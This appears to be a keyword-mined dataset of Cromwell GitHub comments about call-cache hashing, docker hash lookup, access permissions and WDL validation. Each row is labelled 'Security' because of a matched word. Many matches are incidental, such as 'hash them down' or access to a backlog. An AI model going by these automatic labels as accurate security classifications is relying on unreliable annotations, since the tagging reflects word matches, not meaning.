Security,"@helgridly @davidangb for context, our understanding is that the absolute worst case here is, ""Cromwell might make a change, meaning that Rawls/Agora won't validate something that Cromwell could run - if only it were to be submitted"". Or alternatively, ""Cromwell will regress and no longer succeed a workflow that Rawls thinks is fine"". Given the slow rate of change in the WDL draft-2 libraries recently, and the (very significant) pain in updating Rawls and Agora every release, that feels like a reasonable position for a few months while we await the switchover to womtool-as-a-service. Are we missing something?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4941#issuecomment-489665477:156,validat,validate,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4941#issuecomment-489665477,1,['validat'],['validate']
Security,"@illusional . A partial hash is a great idea. I am now downloading a 82 GB bam file in order to check the speed of the algorithm, but unfortunately my network connection is a 100mbits on this PC. It will take 2 hours. Even with a 1000mbit perfect connection it would take at least 12 minutes. So computation time is indeed not the limit here. We need to thinks this through though. Some files are more similar at the beginning (VCF headers come to mind) than at the end. So only hashing the beginning carries with it some major concerns. Using the size is indeed a good thing, and I think we should also include the modification time.; In that case `size+modtime+xx64hsum of first 10mb` should create a unique enough identifier for each file while negating any network performance issues. I think this strategy should be called `hpc`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599448301:24,hash,hash,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599448301,2,['hash'],"['hash', 'hashing']"
Security,"@illusional Ah interesting. That makes sense, we made some changes to how docker is handled internally which postdate that udocker project (which was a one off proof of concept). . As you intimated this behavior on Cromwell's part ties back to reproducibility, but also the question of ""what happens if a container changes in the middle of a workflow?"". As an example, imagine there is a scatter job of 1000 identical tasks, all calling `ubuntu:latest`. And suppose that after processing 750/1000, `latest` is changed. Since we already were capturing the info for provenance we also decided to lock in a hash throughout a workflow. I have a vague memory that you might be able to disable this behavior but I can't find it at the moment. I'll ask the team tomorrow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454618602:604,hash,hash,604,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454618602,1,['hash'],['hash']
Security,"@illusional Setting `docker.hash-lookup.enabled` to `false` **might** work here in terms of the docker hash translations going on. If it does, it'll come with the caveat that call caching will not work for any container using a floating tag",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454829890:28,hash,hash-lookup,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454829890,2,['hash'],"['hash', 'hash-lookup']"
Security,"@illusional Thanks for this. I have been looking into (but not having time for) an easy option that would disable the hash lookup altogether. Cromwell connecting to quay.io while quay.io is down causes crashes we do not want in production. There is a configuration option for this. So it was easy. Unfortunately the hash lookup is coupled with the call-caching mechanic. No hash, no cache. Which is something to be aware of. I was wondering if the easiest way wouldn't be to have the lookup be a command in the config. Just like `docker_kill` there could be a `docker_lookup_hash`. That way you can override the default with a custom command that returns a string (https://stackoverflow.com/a/39376254). . For example:; ```; $ docker inspect --format='{{index .RepoDigests 0}}' mysql:5.6; mysql@sha256:19a164794d3cef15c9ac44754604fa079adb448f82d40e4b8be8381148c785fa; ```; This does NOT need the internet. Similarly, this would enable hash-lookup for singularity users as well without internet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660994330:118,hash,hash,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660994330,4,['hash'],"['hash', 'hash-lookup']"
Security,"@illusional Thanks! Well, I do not know if you have write access. But I am sure the Cromwell team is happy to know that this PR is approved by other people in the HPC space. As regards to `docker_script`. It seems that `script` is what gets generated from the WDL task, and it works flawlessly. I don't know what `docker_script` does. It seems to be mentioned only in some corners of the code base and it is not mentioned in the container documentation. My guess would be that this is a now obsolete remnant of some design choices that have been made in the past. `script` works and it is used in all the examples on the container page, so let's be consistent and use that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630625499:58,access,access,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630625499,1,['access'],['access']
Security,"@illusional. I renamed the strategy `fingerprint` because I think it can be used in a general case. Also because it is called ""fingerprint"" it does carry with it the sense that it only tests a small part of the file, and is therefore less reliable than a strategy that hashes the entire file. (Even though it should be reliable enough). To build a new jar, check out the [documentation](https://cromwell.readthedocs.io/en/stable/developers/Building/). It is as easy indeed as checking out the branch and running `sbt assembly`. It might take a while though. If you run out of memory I believe sbt has a `-mem` flag to set the memory. @cjllanwarne I fully agree with your comments on the documentation part, so I trimmed the changelog and moved the information to the documentation. I hope the documentation is adequate and well-explained enough.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599539307:269,hash,hashes,269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599539307,1,['hash'],['hashes']
Security,@jdidion I didn't receive an email address from you so I didn't manually add you. You should be able to sign up with a gmail account. Full access sometimes is delayed so you may need to try and log in again later.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510059927:139,access,access,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510059927,1,['access'],['access']
Security,@jdidion I've added you. Let me know if you still need help with access.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510062459:65,access,access,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510062459,1,['access'],['access']
Security,"@jgainerdewar Latest updates [here](https://github.com/broadinstitute/cromwell/pull/7000). Note that the error in the CI build seems to be a test error related to call caching, and way above that in the build spew there were notifications about not having access to `ubuntu:latest`. Not sure if those two observations are related. I also don't know if the build/test failures are related to the fact we haven't merged the latest changes from `develop` into this PR yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995:256,access,access,256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995,1,['access'],['access']
Security,"@jgainerdewar Since I don't have write access to this PR, here are my changes: https://github.com/broadinstitute/cromwell/pull/6997",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1413802403:39,access,access,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1413802403,1,['access'],['access']
Security,"@jmthibault79 One of our standing rules is to never reinvoke an entire jes job for someone w/o their consent (i.e. ""cost them money""). It's possible to wire in some pre-authorization but that should be a cross-PO type conversation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2233#issuecomment-298731424:169,authoriz,authorization,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2233#issuecomment-298731424,1,['authoriz'],['authorization']
Security,"@jsotobroad I haven't run this at scale on JES, but with some small local tests I'm pretty sure that's the reason why scatter collection is so slow with call caching on.; We basically re-compute hashes for all the elements in the array when the shards are collected...; I ran without and with this fix and scatter collection went from ~75ms to ~2ms.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/853#issuecomment-220192170:195,hash,hashes,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/853#issuecomment-220192170,1,['hash'],['hashes']
Security,@katevoss ; I would like to add our use-case for the ability to access an ID of a workflow/subworkflow. Our users want the output of the Cromwell to be copied to their local locations and they complain that they cannot read the directory structure - I agree with them as they are data scientists and they want something useful after the pipeline finishes. As we provide the service we are responsible to provide them with something. An idea was to use [croo](https://github.com/ENCODE-DCC/croo) to achieve this. It is really useful solution but it requires manual intervention and knowledge of the pipeline IDs etc. Thus I though I could split the workflow into root and two sub-workflows: `do-the-job` and `copy-files`. However to achieve this the `copy-files` would need to have an access to the `do-the-job` sub-workflow ID or at least the root workflow ID to query for the metadata. I agree it is not deterministic and it should not be. Such a task cannot be cached too.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-537417825:64,access,access,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-537417825,2,['access'],['access']
Security,"@katevoss IIRC the intended behavior is that submitted files are stored as-is no matter what and then when we pick up the workflow we check to see if everything is valid. However @cjllanwarne noticed that we are actually validating one of the input files at actual submission time which led to two issues: a) there was a reason why we didn't want to do that in the first place, b) there was a suspicion that this could lead to timeouts instead of errors anyways",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328278898:221,validat,validating,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328278898,1,['validat'],['validating']
Security,"@katevoss This one is important. Although I am open to alternatives, I believe that we need a way to set any parameter from the json file -- no matter how deeply buried the parameter is within subworkflows, etc. Having to explicitly expose parameters has become too big a hardship on developers and has now led to a bugfix GATK4 release with another one forthcoming.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2912#issuecomment-363466390:233,expose,expose,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2912#issuecomment-363466390,1,['expose'],['expose']
Security,"@katevoss Without looking at it, I suspect this would be as easy as removing the validation check. I have a feeling we're also checking where we're supposed to be, making this check not only in the wrong location but also superfluous. My vague recollection was that this was added after the fact by a well intentioned do gooder.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328299188:81,validat,validation,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328299188,1,['validat'],['validation']
Security,"@katevoss commented on [Thu Dec 08 2016](https://github.com/broadinstitute/dsde-docs/issues/1515). - [ ] Link to [Dev Docs](https://software.broadinstitute.org/wdl/devzone), latest version and release notes, blog, contact us (Slack and Forum), WDL Spec, [WDL website](https://software.broadinstitute.org/wdl/), [GATK website](https://software.broadinstitute.org/gatk/); - [ ] Link and describe the following files: [Authors](https://github.com/broadinstitute/cromwell/blob/develop/AUTHORS), [Changelog](https://github.com/broadinstitute/cromwell/blob/develop/CHANGELOG.md), [Apache License](https://github.com/broadinstitute/cromwell/blob/develop/LICENSE-ASL-2.0), [Broad License](https://github.com/broadinstitute/cromwell/blob/develop/LICENSE.txt), [Migration](https://github.com/broadinstitute/cromwell/blob/develop/MIGRATION.md), [Making a Backend](https://github.com/broadinstitute/cromwell/blob/develop/MakingABackend.MD), [Notice](https://github.com/broadinstitute/cromwell/blob/develop/NOTICE), [Security](https://github.com/broadinstitute/cromwell/blob/develop/SecurityRecommendations.md).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1768:1004,Secur,Security,1004,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1768,2,['Secur'],"['Security', 'SecurityRecommendations']"
Security,"@katevoss we can reuse the result even if the original input file is gone, because we record the hash of the file at execution time. That way, even if the old input file is modified, we won't call-cache unless the new input file matches what was used to generate the original result.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560563:97,hash,hash,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560563,1,['hash'],['hash']
Security,"@kbergin `womtool validate` now (technically, next time Cromwell is released) has an optional flag to supply an `inputs.json` to validate against - is that what you meant?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-386009040:18,validat,validate,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-386009040,2,['validat'],['validate']
Security,@kcibul I created tickets related to this and scheduled a meeting on Monday to hash them down.; Let me know if that covers this ticket and if so I'll close it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1820#issuecomment-272209802:79,hash,hash,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1820#issuecomment-272209802,1,['hash'],['hash']
Security,"@kcibul with the 20k genomes complete, would you say slow hashing is still a problem?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1623#issuecomment-325658884:58,hash,hashing,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1623#issuecomment-325658884,1,['hash'],['hashing']
Security,"@kmavrommatis - Curious how your AWS Batch environment was setup. Did you use the Cfn templates provided [here](https://docs.opendata.aws/genomics-workflows/aws-batch/configure-aws-batch-cfn/), or build it manually?. It is important that the job instance profile associated with the compute environment has the correct access permissions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542#issuecomment-454188024:319,access,access,319,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542#issuecomment-454188024,1,['access'],['access']
Security,@knoblett I replied directly to the forum post. . This is already part of Cromwell (FC actually duplicates us!). The user needs to start up Cromwell in server mode and can then access the timing diagram at:; ```; http://<HOST>:<PORT>/api/workflows/v1/<WORKFLOWID>/timing; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2179#issuecomment-296784331:177,access,access,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2179#issuecomment-296784331,1,['access'],['access']
Security,"@kshakir is this a dupe of the Docker hashing work that is already completed? If so, I'll close it out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-286154588:38,hash,hashing,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-286154588,1,['hash'],['hashing']
Security,"@kshakir the 'where should stuff go' convo got clipped. Looking at your links, one could make an argument that the wdl should go in `src/it` (which still doesn't answer the question of the encrypted travis file). I don't really care where they go, so if you do just tell me where to stick 'em otherwise i'll leave them in src/main/resources",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1050#issuecomment-228136691:189,encrypt,encrypted,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1050#issuecomment-228136691,1,['encrypt'],['encrypted']
Security,"@kshakir, thank you for your detailed explanation. If you do not mind, could you please shed some light on the one more thing.; I have a little bit messy with the definition of what the default credentials are.; Does it mean that the credentials, which Travis and Jenkins use, are default credentials and the purpose of this task is to set other ones and check that four tests were successfully passed? In my point of view, it looks insecure to pass my keys and AWS environments for CI testing. This is why I think that I missed something. Also, in case if I suggest a fix for this task I will not be able to check the results of CI testing by myself cause I do not have access to the Jenkins. Is it possible to get access in read-only mode or I can communicate with someone who can provide testing results?. Thank you in advance for your answers!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-504776413:671,access,access,671,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-504776413,2,['access'],['access']
Security,@lbergelson the issue has been fixed. Let me know if you still aren’t able to access our backlog.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502078996:78,access,access,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502078996,1,['access'],['access']
Security,@leetl1220 is seeing an issue on 0.19 with a large Docker hash overflowing the DOCKER_IMAGE_HASH. Expanding from 100 chars to 255 gets him around the problem.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1301:58,hash,hash,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1301,1,['hash'],['hash']
Security,"@matthewghgriffiths did it work with `\cromwell_mount` or `\cromwell_root`. I'm getting a very similar error, and I've double checked that I had ""cromwell_root"" as listed [here](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/#custom-ami-with-cromwell-additions). I created my AMI today, and I definitely have read / write access from my EC2 instance. I also can't see any Cromwell-execution folders in the bucket, but I do see the cromwell-workflow-logs on my EC2 instance. I created the AMI with the cromwell type, and I've checked that my IAM profile has access to the execution and storage bucket, and confirmed this in the CLI. . ```; Caused by: java.io.IOException: Could not read from s3://<bucket-name>/cromwell-execution/gatkRecalNormal/df58d76a-c3fe-4fb7-94c6-f4bd9ad1d5de/call-gatkBaseRecalibrator/gatkBaseRecalibrator-rc.txt: s3://s3.amazonaws.com/<bucket-name>/cromwell-execution/gatkRecalNormal/df58d76a-c3fe-4fb7-94c6-f4bd9ad1d5de/call-gatkBaseRecalibrator/gatkBaseRecalibrator-rc.txt; 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:146); 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:145); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at scala.util.Failure.recoverWith(Try.scala:232); 	at cromwell.engine.io.nio.NioFlow.withReader(NioFlow.scala:145); 	at cromwell.engine.io.nio.NioFlow.limitFileContent(NioFlow.scala:154); 	at cromwell.engine.io.nio.NioFlow.$anonfun$readAsString$1(NioFlow.scala:98); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:336); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:357); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:303); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437251651:348,access,access,348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437251651,2,['access'],['access']
Security,@mbookman our backlog has been moved to Jira. Here is the link to this [ticket](https://broadworkbench.atlassian.net/browse/BA-2168) ; You will need to create an account to access this ticket. I defer to @ruchim for priority of this feature.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-499987555:173,access,access,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-499987555,1,['access'],['access']
Security,"@mcovarr ; Is the bucket http://s3.amazonaws.com/cromwell-centaur-execution/ public? Because when I tried to open it, I've got `AccessDenied`. ; As far as I know, centaur do not share credentials with cromwell (at least if credentials were provided in `.conf` file, idk what about default auth mechanism), and therefore this exception may be caused by lack of credentials on centaur side.; Actually, in this PR a support for aws auth was added to centaur, so can you please try to run this test with aws credentials in `centaur/src/main/resources/reference.conf`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-544924499:128,Access,AccessDenied,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-544924499,1,['Access'],['AccessDenied']
Security,"@mcovarr @cjllanwarne I made substantial changes to allow for automatic release number calculation and added the few things we talked about (pin centaur branch, add hotfix branch). It still has command injection though...; I tested it on a fork and as far as I can tell everything looked good.; If you don't mind re-giving it a look, otherwise I'll probably merge it as is.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2065#issuecomment-287431325:202,inject,injection,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2065#issuecomment-287431325,1,['inject'],['injection']
Security,"@mcovarr @ruchim I confirmed that this is fine. The underlying PAPI job will fail as expected (since it does not have rights to access BQ) but nothing blows up in a weird way. . Steps:. 1. Make a minimally permissioned SA and try running. This succeeds as the default compute service account has editor access. However, nothing blew up when setting the BQ scope. Sorta success.; 2. Use that minimally permissioned SA as the `google_compute_service_account` - the PAPI job fails as expected, but nothing else untoward happened. Great success.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5023#issuecomment-503668465:128,access,access,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5023#issuecomment-503668465,2,['access'],['access']
Security,"@mcovarr I believe all issues are addressed. I'll let you cherry-pick / merge / squash or even reject this PR at your will. Pre-tech talk with @geoffjentry (including a TLA extravaganza!):. **TL;DR The database/slick is for CRUD, not for the T in ETL.**. IMHO, the database code started to evolve well beyond CRUD. Very often in slick specific code, one saw multiple lines of code like: ""before inserting rows in slick, quickly (E)xtract some other rows, (T)ransform them into core objects, filter, re-transform them into new core objects, then (L)oad the new objects into slick."" That ETL embedded in slick could never be used DRY-ly, and to me smelled as violating separation of concerns. With the current SoC, the slick code is _mostly_ concerned with marshaling data to and from the database via slick. If I wanted to, I could very trivially create a different layer that marshaled data using hibernate, a thin layer of prepared statements, mocks, etc., _without_ duplicating a lot of the ETL code. Another way of visualizing the issue: Below is the current project dependency diagram. The services need to access data from the database. Currently that's implemented as the services depend on engine that depends on the database. The database used to have a similar same circular dependency. Gun-shy of folks (including myself) re-introducing a similar dependency loop, I've kept core as far away as possible from the database/slick, because the slick specific code _should not_ need core for basic CRUD. As for the rest of the system, I see core as a base of objects for backends and the engine to communicate. ![cromwell project dependency diagram](https://cloud.githubusercontent.com/assets/791985/15779136/92db94a6-2968-11e6-90f8-c0b40d162a56.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/935#issuecomment-223577591:1111,access,access,1111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/935#issuecomment-223577591,1,['access'],['access']
Security,"@mcovarr I don't *think* so but as I mentioned earlier I wasn't completely buying what jprofiler was selling and need to take a closer look. Also our comparisons shouldn't be hash code based anyways. One thing I did turn up was elsewhere in that file you had been converting some sets to lists to avoid hashes coming out of filters and such, that might be a thing here as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277886109:175,hash,hash,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277886109,2,['hash'],"['hash', 'hashes']"
Security,"@mcovarr It's more concise but it makes several implicit assumptions to fit exactly our 2 current JES use cases (GotC and FireCloud).; IMO it should be flexible enough so that GotC and Firecloud are just combinations of configuration entries among all the possible ones. > // The JES backend is assumed to use the GCS filesystem with user authentication, dropping back to Cromwell; > // authentication if user authentication is not defined. In GotC there is no user authentication, so; > // Cromwell authentication it is. This is tailor made to accommodate GotC and FireCloud with as few configuration changes as possible, but I think we should move towards something more generic, even if the confs look a bit more different between the two.; For example what if you want to use refresh token auth mode for creating the pipeline as well ?; Or refresh token only for pipeline and service account for gcs ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203453031:339,authenticat,authentication,339,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203453031,5,['authenticat'],['authentication']
Security,"@mcovarr Yeah the reason for this PR is that there is currently a mutable `var` that holds the process when it's created, so it can be accessed by the abort method. I know `var`s are evil but in this case creating an underlying FSM just to get rid of this `var` does seem an overkill to me. I couldn't find a way to use the `BackendJobExecutionActor` itself to encapsulate this mutable state though, which is why I ended up with this. I can give it another shot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/734#issuecomment-214750391:135,access,accessed,135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/734#issuecomment-214750391,1,['access'],['accessed']
Security,@mcovarr any chance of getting it re-released as 28.1 or 29? Unfortunately users will just get a checksum mismatch error if the jar is already in their cache since cromwell is `bottle :unneeded`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316010288:97,checksum,checksum,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316010288,1,['checksum'],['checksum']
Security,@mcovarr is there any input validation now? Or are malformed inputs still poorly handled?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1740#issuecomment-326409216:28,validat,validation,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1740#issuecomment-326409216,1,['validat'],['validation']
Security,@mcovarr right - anything in here gets picked up by the `WomtoolValidateSpec` and run through `womtool validate`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4384#issuecomment-438426231:103,validat,validate,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4384#issuecomment-438426231,1,['validat'],['validate']
Security,"@mcovarr that's true, I think it would fail eventually anyway whenever something tries to access those files (or not if nothing does ?) ? And I thought that one of the assumption in this ""no-copy"" mode is that we expect the files to be relatively immutable anyway. . But I also agree that it would be cleaner to fail the ""caching"" if they don't exist rather than the downstream task failing by itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2347#issuecomment-307422116:90,access,access,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2347#issuecomment-307422116,1,['access'],['access']
Security,"@mcovarr: ""It's the deep hashCode computation to determine map buckets that's the problem."" how did you determine this? jprofiler?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277882112:25,hash,hashCode,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277882112,1,['hash'],['hashCode']
Security,"@mcovarr: ; > how do these changes enable WDL 1.0 support. It replaces the use of WDL draft 2 objects to build a graph with the use of WOM objects to build the graph. > or the tests confirm that support has been added?. The tests make sure that the examples in the `womtool validate` test suite (which includes WDL draft-2 and 1.0) also run to completion in `womtool graph`. It doesn't assert that the output is _correct_ per se, but it does check that the process exits with a non-failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5326#issuecomment-567208623:274,validat,validate,274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5326#issuecomment-567208623,1,['validat'],['validate']
Security,"@meganshand Was this resolved by using the file-path hashing method? If so, can I close this ticket?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272244992:53,hash,hashing,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272244992,1,['hash'],['hashing']
Security,"@meganshand commented on [Fri Apr 29 2016](https://github.com/broadinstitute/wdltool/issues/9). The following task results in an uninformative error message when using `validate`: . ```; task printReads {; File bam; File ref_fasta; File ref_fasta_index; File ref_dict. command {; java -jar /usr/gitc/GenomeAnalysisTK.jar \; -T PrintReads \; -I ${bam} \; -o smaller.bam \; -L chr1 \; -R ${ref_fasta}; }; runtime {; docker: ""broadinstitute/genomes-in-the-cloud:1.1010_with_gatk3.5""; disks: ""local-disk 400 SSD""; memory: ""10 GB""; }; output {; File smaller = smaller.bam; }; }; ```. results in this error message:. ```; SLF4J: Failed to load class ""org.slf4j.impl.StaticLoggerBinder"".; SLF4J: Defaulting to no-operation (NOP) logger implementation; SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.; ```. The problem is that there aren't quotes around ""smaller.bam"" in the outputs of the task. It would be great if the error message could tell you which line or object was causing the problem. The error message from cromwell is different, but also uninformative and it would be great if the error message could be clearer there as well.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2875:169,validat,validate,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2875,1,['validat'],['validate']
